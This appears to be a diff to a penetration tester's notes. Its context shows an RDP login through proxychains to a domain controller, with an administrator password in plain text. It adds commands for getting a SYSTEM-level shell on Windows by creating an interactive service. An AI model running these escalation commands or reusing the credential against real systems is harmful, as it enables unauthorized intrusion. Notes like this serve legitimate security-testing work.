@@ -592,3 +592,16 @@ xfreerdp pwd
 ```
 proxychains -q -f web05.conf xfreerdp /u:administrator /d:dmzdc01.corpy.com /p:fgds90345SDfsw32 /v:dmzdc01.corpy.com /cert-ignore
 ```
+cmd.exe as "NT Authority\SYSTEM" without psexec
+```
+# powershell - first enable interactive services
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Windows" -Name "NoInteractiveServices" -Value 0
+```
+```
+# cmd - start interactive services
+sc start ui0detect
+```
+```
+sc create cmdsvc binpath= “cmd /K start” type= own type= interact
+sc start cmdsvc
+```
